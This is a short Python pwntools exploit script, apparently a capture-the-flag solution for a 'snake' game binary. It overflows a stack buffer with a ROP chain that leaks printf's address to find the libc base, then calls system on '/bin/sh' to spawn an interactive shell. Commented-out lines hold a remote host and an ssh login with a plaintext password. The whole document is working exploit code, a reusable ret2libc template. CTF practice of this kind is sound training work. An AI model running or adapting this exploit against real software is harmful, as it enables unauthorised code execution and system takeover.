#utf-8
from pwn import *
context.log_level='debug'

sh = process('./snake')
#sh = remote('47.104.143.202',25997)
#s = ssh(host='127.0.0.1',user='ctf',password='NUAA2021',port=65500)
#sh = s.process('/home/ctf/tanchishe')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./snake')

sh.recvuntil('Continue...')
sh.send('\n')

sh.recvuntil('Exit')
sh.send('\n')

sh.recvuntil('1 and 9.')
sh.send('9')

sh.recv()
sh.recvuntil(':.......::::::...:::::........::..:::::..::....::\n')
sh.send('\n')

pause()
pop_rdi = 0x00000000004030e3
pop_rsi_r15 = 0x00000000004030e1

#gdb.attach(sh,'b *0x401737')
sh.send(b'a'*0xc0 +p64(0) + p64(0x1f951) + p64(0)*7 + p64(pop_rdi) + p64(elf.got['printf'])+p64(0x4011e0) + p64(0x401502) +b'\n')
#c0 7
sh.recvuntil('\x10')
libcbase = u64( ( b'\x10' +  sh.recv(5)).ljust(8,b'\x00') ) + 0x7f1c41b1b000 -0x7f1c41b7fe10
log.success(hex(libcbase))
#pause()
binsh = libcbase + 0x7f7c9aa4c5aa - 0x7f7c9a895000

sh.recvuntil('name')
#gdb.attach(sh,'b *0x401737')
#
sh.send(b'a'*0xc0 +p64(0) + p64(0x1f951) + p64(0)*7 + p64(pop_rdi) + p64(binsh) +p64(0x401757)+p64(elf.plt['system']) + p64(0x401502) +b'\n')
##############in ssh change system to orw

sh.interactive()
#log.success(hex(libcbase))
